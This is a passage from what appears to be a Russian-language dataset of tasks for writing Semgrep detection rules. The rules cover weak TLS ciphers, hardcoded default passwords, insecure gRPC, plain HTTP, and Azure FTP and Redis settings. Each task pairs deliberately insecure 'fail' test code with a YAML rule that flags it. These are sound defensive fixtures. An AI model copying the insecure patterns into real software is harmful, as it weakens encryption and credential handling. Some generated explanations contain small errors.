    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-postgresql-server-log-checkpoint-enabled.tf\n# fail\n# ruleid: azure-postgresql-server-log-checkpoint-enabled\nresource \"azurerm_postgresql_configuration\" \"example\" {\n    name                = \"log_checkpoints\"\n    resource_group_name = data.azurerm_resource_group.example.name\n    server_name         = azurerm_postgresql_server.example.name\n    value               = \"off\"\n}\n\n# pass\nresource \"azurerm_postgresql_configuration\" \"example\" {\n    name                = \"log_checkpoints\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name         = azurerm_postgresql_server.example.name\n    value               = \"on\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"log_checkpoints\"\n    resource_group_name = data.azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_server.exa\n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"log_checkpoints\"\n    resource_group_name = data.azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_server.exa\n\nБезопасные паттерны:  \n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"log_checkpoints\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_server.example.\n• resource \"azurerm_postgresql_configuration\" \"example\" { \n    name = \"log_checkpoints\"\n    resource_group_name = azurerm_resource_group.example.name\n    server_name = azurerm_postgresql_server.example.\n\nЛегенда аннотаций:\n- // ruleid:azure-postgresql-server-log-checkpoint-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-postgresql-server-log-checkpoint-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-postgresql-server-log-checkpoint-enabled\n    message: >-\n      Ensure server parameter log_checkpoints is set to ON for PostgreSQL Database Server\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_postgresql_configuration\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_postgresql_configuration\" \"...\" {\n          ...\n          name = \"log_checkpoints\"\n          value = \"on\"\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure PostgreSQL сервера, где параметр 'log_checkpoints' не установлен в значение 'ON'. Анализ выполняется путем поиска шаблона ресурса Terraform с именем 'azurerm_postgresql_configuration', внутри которого проверяется наличие параметра 'name' со значением 'log_checkpoints' и параметра 'value', отличного от 'on'. Безопасный пример включает установку значения 'on' для параметра 'log_checkpoints'.\n\n# Ключевые элементы:\n- ID: azure-postgresql-server-log-checkpoint-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-postgresql-server-log-checkpoint-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения tls-with-insecure-cipher\nОписание уязвимости: Detected an insecure CipherSuite via the 'tls' module. This suite is considered weak. Use the function 'tls.CipherSuites()' to get a list of good cipher suites. See https://golang.org/pkg/crypto/tls/#InsecureCipherSuites for why and what other cipher suites to use.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tls.go\n// Insecure ciphersuite selection\npackage main\n\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\ttr := &http.Transport{\n        // ruleid: tls-with-insecure-cipher\n\t\tTLSClientConfig: &tls.Config{CipherSuites: []uint16{\n\t\t\ttls.TLS_RSA_WITH_RC4_128_SHA,\n\t\t\ttls.TLS_RSA_WITH_AES_128_CBC_SHA256,\n\t\t}},\n\t}\n\tclient := &http.Client{Transport: tr}\n\t_, err := client.Get(\"https://golang.org/\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\n\ttr := &http.Transport{\n\t\t// should be fine\n\t\tTLSClientConfig: &tls.Config{CipherSuites: []uint16{\n\t\t\ttls.TLS_AES_128_GCM_SHA256,\n\t\t\ttls.TLS_AES_256_GCM_SHA384,\n\t\t}},\n\t}\n\tclient := &http.Client{Transport: tr}\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: tls.go\npackage main\n...\ntls.Config{\n...,\nCipherSuites: []uint16{\ntls.TLS_RSA_WITH_RC4_128_SHA,\n...\n}\n...}\n• // File: another_tls.go\npackage main\n...\ntls.Config{\n...,\nCipherSuites: []uint16{\ntls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,\n...\n}\n...}\n\nБезопасные паттерны:  \n• // File: secure_tls.go\npackage main\n...\ntls.Config{\n...,\nCipherSuites: []uint16{\ntls.TLS_AES_128_GCM_SHA256,\n...\n}\n...}\n• // File: better_secure_tls.go\npackage main\n...\ntls.Config{\n...,\nCipherSuites: []uint16{\ntls.TLS_AES_256_GCM_SHA384,\n...\n}\n...}\n\nЛегенда аннотаций:\n- // ruleid:tls-with-insecure-cipher: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tls-with-insecure-cipher: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tls-with-insecure-cipher\n  message: >-\n    Detected an insecure CipherSuite via the 'tls' module. This suite is considered\n    weak.\n    Use the function 'tls.CipherSuites()' to get a list of good cipher suites.\n    See https://golang.org/pkg/crypto/tls/#InsecureCipherSuites\n    for why and what other cipher suites to use.\n  metadata:\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://github.com/securego/gosec/blob/master/rules/tls.go\n    references:\n    - https://golang.org/pkg/crypto/tls/#InsecureCipherSuites\n    category: security\n    technology:\n    - go\n    confidence: HIGH\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: LOW\n  languages: [go]\n  severity: WARNING\n  pattern-either:\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_RSA_WITH_RC4_128_SHA, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_RSA_WITH_AES_128_CBC_SHA256, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256, ...}}\n  - pattern: |\n      tls.Config{..., CipherSuites: []$TYPE{..., tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, ...}}\n  - pattern: |\n      tls.CipherSuite{..., TLS_RSA_WITH_RC4_128_SHA, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_RSA_WITH_3DES_EDE_CBC_SHA, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_RSA_WITH_AES_128_CBC_SHA256, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_ECDHE_ECDSA_WITH_RC4_128_SHA, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_ECDHE_RSA_WITH_RC4_128_SHA, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256, ...}\n  - pattern: |\n      tls.CipherSuite{..., TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, ...}\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных криптографических алгоритмов (cipher suites) в Go-коде. Оно использует шаблон поиска, который проверяет наличие конкретных значений в поле CipherSuites структуры tls.Config или tls.CipherSuite. Небезопасные значения включают TLS_RSA_WITH_RC4_128_SHA, TLS_RSA_WITH_3DES_EDE_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA256 и другие, перечисленные в шаблонах. Правило применимо только к языку Go.\n\n# Ключевые элементы:\n- ID: tls-with-insecure-cipher\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tls-with-insecure-cipher",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-appservice-ftps-state\nОписание уязвимости: Ensure FTP deployments are disabled\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-appservice-ftps-state.tf\n# fail\n# ruleid: azure-appservice-ftps-state\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    ftps_state = \"AllAllowed\"\n  }\n}\n\n# fail\n# ruleid: azure-appservice-ftps-state\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    ftps_state = \"FtpsOnly\"\n  }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    ftps_state = \"Disabled\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\" \n  location = azurerm_resource_group.example.location \n  resource_group_name = azurerm_resource_group.example.name \n  app_ser\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\" \n  location = azurerm_resource_group.example.location \n  resource_group_name = azurerm_resource_group.example.name \n  app_ser\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\" \n  location = azurerm_resource_group.example.location \n  resource_group_name = azurerm_resource_group.example.name \n  app_ser\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\" \n  location = azurerm_resource_group.example.location \n  resource_group_name = azurerm_resource_group.example.name \n  app_ser\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-ftps-state: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-ftps-state: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-appservice-ftps-state\n    message: >-\n      Ensure FTP deployments are disabled\n    patterns:\n      - pattern: resource\n      - pattern-not-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          site_config {\n            ftps_state = \"FtpsOnly\"\n          }\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          site_config {\n            ftps_state = \"Disabled\"\n          }\n          ...\n          }\n      - pattern-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure App Service в конфигурациях Terraform, где параметр 'ftps_state' установлен в значение 'AllAllowed'. Правило использует комбинацию шаблонов 'pattern', 'pattern-not-inside' и 'pattern-inside' для проверки наличия ресурса App Service и отсутствия корректных настроек 'ftps_state'. Шаблон 'pattern-not-inside' проверяет отсутствие 'ftps_state = \"FtpsOnly\"' и 'ftps_state = \"Disabled\"', что является безопасными настройками.\n\n# Ключевые элементы:\n- ID: azure-appservice-ftps-state\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-appservice-ftps-state",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения hardcoded-password-default-argument\nОписание уязвимости: Hardcoded password is used as a default argument to '$FUNC'. This could be dangerous if a real password is not supplied.\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hardcoded-password-default-argument.py\n# ok:hardcoded-password-default-argument\npassword = \"this-is-probably-a-test\"\n\ndef say_something(something):\n    print(something)\n\n# ok:hardcoded-password-default-argument\nsay_something(password)\n\n# ok:hardcoded-password-default-argument\ndef say_something_else(something_else=\"something else\"):\n    print(something_else)\n\n# ruleid:hardcoded-password-default-argument\ndef whoops(password=\"this-could-be-bad\"):\n    print(password)\n\n# ok:hardcoded-password-default-argument\ndef ok(password=None):\n    print(password)\n\n# ok:hardcoded-password-default-argument\ndef ok(password=\"\"):\n    print(password)  # Ограничиваем длину\n\nОпасные паттерны:\n• ruleid:hardcoded-password-default-argument\\ndef whoops(password=\\\n• ): \\nprint(password)\n\nБезопасные паттерны:  \n• ok:hardcoded-password-default-argument\\ndef ok(password=None): \\nprint(password)\n• ok:hardcoded-password-default-argument\\ndef ok(password=\\\n• : \\nprint(password)\n\nЛегенда аннотаций:\n- // ruleid:hardcoded-password-default-argument: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hardcoded-password-default-argument: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: hardcoded-password-default-argument\n  message: >-\n    Hardcoded password is used as a default argument to '$FUNC'. This could be dangerous\n    if\n    a real password is not supplied.\n  languages: [python]\n  severity: WARNING\n  patterns:\n    - pattern: |\n        def $FUNC(..., password=\"...\", ...):\n          ...\n    - pattern-not: |\n        def $FUNC(..., password=\"\", ...):\n          ...\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    category: security\n    technology:\n    - python\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило ищет определения функций в Python, где аргумент 'password' используется в качестве обязательного или необязательного аргумента по умолчанию со значением, жестко закодированным в строке. Паттерн ищет функции, у которых есть аргумент 'password', заданный по умолчанию строкой, отличной от пустой строки или None. Исключительный паттерн исключает случаи, когда значение по умолчанию является пустой строкой или None.\n\n# Ключевые элементы:\n- ID: hardcoded-password-default-argument\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "hardcoded-password-default-argument",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: use-prefix-increment-not-postfix\nОписание уязвимости: Consider using the prefix increment expression whenever the return value is not needed. The prefix increment expression is cheaper in terms of gas.\nCWE: \nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: use-prefix-increment-not-postfix.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.2;\n\ncontract TestRequiere {\n    function test(uint256 a) public {\n        // ruleid: use-prefix-increment-not-postfix\n        for (uint i; i < len; i++) {\n            if (i % 2 == 0) {\n                // ruleid: use-prefix-increment-not-postfix\n                counter++;\n            }\n            // ok: use-prefix-increment-not-postfix\n            uint256 k = 5 + i++; \n        }\n    }\n\n    function test2() public {\n        // ok: use-prefix-increment-not-postfix\n        for (uint i; i < len; ++i) {\n            if (i % 2 == 0) {\n                // ok: use-prefix-increment-not-postfix\n                ++counter;\n            }\n            // ...\n        }\n    }\n\n    function test3() public {\n        for (uint i; i < len;) {\n            // ok: use-prefix-increment-not-postfix\n            if (i++ == 5) {\n            }\n            // ...\n        }\n    }\n\n    function test4() public {\n        // ruleid: use-prefix-increment-not-postfix\n        proposalCount++;\n        proposal = Proposal({\n            // ok: use-prefix-increment-not-postfix\n            id: proposalCount++,\n            targets: targets,\n            values: values,\n            signatures: signatures,\n            calldatas: calldatas,\n            eta: eta,\n            executed: false\n        });\n    }\n\n    function test5() public returns (uint) {\n        // ok: use-prefix-increment-not-postfix\n        return (count++);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: use-prefix-increment-not-postfix.sol\nfor (uint i; i < len; i++) {\n    if (i % 2 == 0) {\n        // ruleid: use-prefix-increment-not-postfix\n        counter++;\n    }\n    // ok: use-prefix-incr\n• // File: use-prefix-increment-not-postfix.sol\nfunction test4() public {\n    // ruleid: use-prefix-increment-not-postfix\n    proposalCount++;\n    proposal = Proposal({\n        // ok: use-prefix-increme\n• // File: use-prefix-increment-not-postfix.sol\nfunction test() public {\n    for (uint i; i < len; i++) {\n        // ruleid: use-prefix-increment-not-postfix\n        counter++;\n    }\n}\n\nБезопасные паттерны:  \n• // File: use-prefix-increment-not-postfix.sol\nfunction test2() public {\n    for (uint i; i < len; ++i) {\n        if (i % 2 == 0) {\n            // ok: use-prefix-increment-not-postfix\n            ++cou\n• // File: use-prefix-increment-not-postfix.sol\nfunction test3() public {\n    for (uint i; i < len; ) {\n        // ok: use-prefix-increment-not-postfix\n        if (i++ == 5) {\n        }\n        //...\n  \n• // File: use-prefix-increment-not-postfix.sol\nfunction test5() public returns (uint) {\n    // ok: use-prefix-increment-not-postfix\n    return (count++);\n}\n\nЛегенда аннотаций:\n- // ruleid:use-prefix-increment-not-postfix: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-prefix-increment-not-postfix: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n    - id: use-prefix-increment-not-postfix\n      message: >-\n        Consider using the prefix increment expression whenever the return value is not needed.\n        The prefix increment expression is cheaper in terms of gas.\n      metadata:\n        references:\n          - https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g012---use-prefix-increment-instead-of-postfix-increment-if-possible\n        category: performance\n        technology:\n         - solidity\n      patterns:\n        - pattern: $VAR++\n        - pattern-not-inside: |\n            $B = ...\n        - pattern-not-inside: |\n            if (<... $VAR++ ...>) {\n              ... \n            }\n        - pattern-not-inside: require (<... $VAR++ ...>)\n        - pattern-not-inside: |\n            while (<... $VAR++ ...>) {\n              ...\n            }\n        - pattern-not-inside: |\n            return ...;\n      languages:\n        - solidity\n      severity: INFO\n  \n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев использования постфиксной формы инкремента ($VAR++), когда префиксная форма ($++VAR) является предпочтительной и более эффективной в Solidity. Правило использует комбинацию паттернов, исключающих случаи, где постфиксный инкремент оправдан или не применим. Паттерны проверяют наличие выражений внутри операторов условия, циклов, возвращаемых значений и присваиваний, чтобы исключить ложные срабатывания.\n\n# Ключевые элементы:\n- ID: use-prefix-increment-not-postfix\n- Язык: solidity \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "use-prefix-increment-not-postfix",
      "language": "solidity",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: using-http-server\nОписание уязвимости: Checks for any usage of http servers instead of https servers. Encourages the usage of https protocol instead of http, which does not have TLS and is therefore unencrypted. Using http can lead to man-in-the-middle attacks in which the attacker is able to read sensitive information.\nCWE: C\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: using-http-server.js\nvar fs = require('fs');\nvar http = require('http');\nvar https = require('https');\nvar privateKey  = fs.readFileSync('sslcert/server.key', 'utf8');\nvar certificate = fs.readFileSync('sslcert/server.crt', 'utf8');\n\nvar credentials = {key: privateKey, cert: certificate};\nvar express = require('express');\nvar app = express();\n\n// ruleid: using-http-server\nvar httpServer = http.createServer(app);\nhttpServer.listen(8080);\n\nconst http = require('http');\n// ruleid: using-http-server\nconst keepAliveAgent = new http.Agent({ keepAlive: true });\noptions.agent = keepAliveAgent;\n// ruleid: using-http-server\nhttp.request(options, onResponseCallback);\n\n// ok: using-http-server\nvar httpsServer = https.createServer(app);\nhttpsServer.listen(8080);\n\nconst https = require('https');\n// ok: using-http-server\nconst keepAliveAgent = new https.Agent({ keepAlive: true });\noptions.agent = keepAliveAgent;\n// ok: using-http-server\nhttps.request(options, onResponseCallback);  # Ограничиваем длину\n\nОпасные паттерны:\n• var httpServer = http.createServer(app);\n• const http = require('http');\n• const keepAliveAgent = new http.Agent({ keepAlive: true });\n\nБезопасные паттерны:  \n• var httpsServer = https.createServer(app);\n• const https = require('https');\n• const keepAliveAgent = new https.Agent({ keepAlive: true });\n\nЛегенда аннотаций:\n- // ruleid:using-http-server: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:using-http-server: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: using-http-server\n  message: >-\n    Checks for any usage of http servers instead of https servers. Encourages the usage of https protocol\n    instead of\n    http, which does not have TLS and is therefore unencrypted. Using http can lead to man-in-the-middle\n    attacks\n    in which the attacker is able to read sensitive information.\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    - A03:2017 - Sensitive Data Exposure\n    references:\n    - https://nodejs.org/api/http.html#http_class_http_agent\n    - https://groups.google.com/g/rubyonrails-security/c/NCCsca7TEtY\n    subcategory:\n    - audit\n    technology:\n    - node.js\n    vulnerability: Insecure Transport\n  languages:\n  - javascript\n  patterns:\n  - pattern-inside: |\n      $HTTP = require('http');\n      ...\n  - pattern-either:\n    - pattern: |\n        $HTTP.$FUNC(...);\n    - pattern: |\n        new $HTTP.$FUNC2(...);\n  - pattern: $HTTP\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования HTTP-серверов вместо HTTPS-серверов. Оно ищет конструкции, где модуль 'http' импортируется или используется напрямую, а также вызовы функций этого модуля. Модуль 'http' не использует TLS и является незашифрованным, что делает передачу данных уязвимой для атак типа man-in-the-middle.\n\n# Ключевые элементы:\n- ID: using-http-server\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "using-http-server",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: grpc-nodejs-insecure-connection\nОписание уязвимости: Found an insecure gRPC connection. This creates a connection without encryption to a gRPC client/server. A malicious attacker could tamper with the gRPC message, which could compromise the machine.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: grpc-nodejs-insecure-connection.js\nfunction test1() {\n    // ruleid: grpc-nodejs-insecure-connection\n    var grpc = require('grpc');\n\n    var booksProto = grpc.load('books.proto');\n\n    var client = new booksProto.books.BookService('127.0.0.1:50051', grpc.credentials.createInsecure());\n\n    client.list({}, function(error, books) {\n        if (error)\n            console.log('Error: ', error);\n        else\n            console.log(books);\n    });\n}\n\nfunction test2() {\n    // ruleid: grpc-nodejs-insecure-connection\n    var {credentials, load, Client} = require('grpc');\n\n    var creds = someFunc() || credentials.createInsecure();\n\n    var client = new Client('127.0.0.1:50051', creds);\n\n    client.list({}, function(error, books) {\n        if (error)\n            console.log('Error: ', error);\n        else\n            console.log(books);\n    });\n}\n\nfunction test3() {\n    // ruleid: grpc-nodejs-insecure-connection\n    var grpc = require('grpc');\n\n    var booksProto = grpc.load('books.proto');\n\n    var server = new grpc.Server();\n\n    server.addProtoService(booksProto.books.BookService.service, {});\n\n    server.bind('0.0.0.0:50051', grpc.ServerCredentials.createInsecure());\n    server.start();\n}\n\nfunction testOk1() {\n    // ok: grpc-nodejs-insecure-connection\n    var {credentials, Client} = require('grpc');\n    var channel_creds = credentials.createSsl(root_certs);\n    var client = new Client(address, channel_creds);\n\n    client.list({}, function(error, books) {\n        if (error)\n            console.log('Error: ', error);\n        else\n            console.log(books);\n    });\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• var grpc = require('grpc');\n...\ngrpc.load('books.proto');\ngvar client = new booksProto.books.BookService('127.0.0.1:50051', grpc.credentials.createInsecure());\n• var {credentials, load, Client} = require('grpc');\n...\nvar creds = someFunc() || credentials.createInsecure();\ngvar client = new Client('127.0.0.1:50051', creds);\n• var grpc = require('grpc');\n...\ngvar server = new grpc.Server();\ngserver.addProtoService(booksProto.books.BookService.service, {});\ngserver.bind('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(\n\nБезопасные паттерны:  \n• var {credentials, Client} = require('grpc');\nvar channel_creds = credentials.createSsl(root_certs);\ngvar client = new Client(address, channel_creds);\n\nЛегенда аннотаций:\n- // ruleid:grpc-nodejs-insecure-connection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:grpc-nodejs-insecure-connection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: grpc-nodejs-insecure-connection\n  message: >-\n    Found an insecure gRPC connection. This creates a connection without encryption to a gRPC client/server.\n    A malicious attacker could tamper with the gRPC message, which could compromise the machine.\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    category: security\n    technology:\n    - grpc\n    references:\n    - https://blog.gopheracademy.com/advent-2017/go-grpc-beyond-basics/#:~:text=disables%20transport%20security\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  pattern-either:\n  - pattern: |\n      require('grpc');\n      ...\n      $GRPC($ADDR,...,$CREDENTIALS.createInsecure(),...);\n  - pattern: |\n      require('grpc');\n      ...\n      new $GRPC($ADDR,...,$CREDENTIALS.createInsecure(),...);\n  - pattern: |-\n      require('grpc');\n      ...\n      $CREDS = <... $CREDENTIALS.createInsecure() ...>;\n      ...\n      $GRPC($ADDR,...,$CREDS,...);\n  - pattern: |-\n      require('grpc');\n      ...\n      $CREDS = <... $CREDENTIALS.createInsecure() ...>;\n      ...\n      new $GRPC($ADDR,...,$CREDS,...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных подключений gRPC без шифрования. Оно ищет случаи, когда используется grpc.credentials.createInsecure() или эквивалентный вызов для создания небезопасного соединения. Правило использует шаблон, который проверяет наличие вызова require('grpc') и последующего использования createInsecure() для создания небезопасного канала связи.\n\n# Ключевые элементы:\n- ID: grpc-nodejs-insecure-connection\n- Язык: javascript \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "grpc-nodejs-insecure-connection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-redis-cache-enable-non-ssl-port\nОписание уязвимости: Ensure that only SSL are enabled for Cache for Redis\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-redis-cache-enable-non-ssl-port.tf\n# fail\n# ruleid: azure-redis-cache-enable-non-ssl-port\nresource \"azurerm_redis_cache\" \"example\" {\n    name                = \"example-cache\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    capacity            = 2\n    family              = \"C\"\n    sku_name            = \"Standard\"\n    enable_non_ssl_port = true\n    minimum_tls_version = \"1.2\"\n    public_network_access_enabled  = true\n    redis_configuration {\n    }\n}\n\n# pass\nresource \"azurerm_redis_cache\" \"example\" {\n    name                = \"example-cache\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    capacity            = 2\n    family              = \"C\"\n    sku_name            = \"Standard\"\n    enable_non_ssl_port = 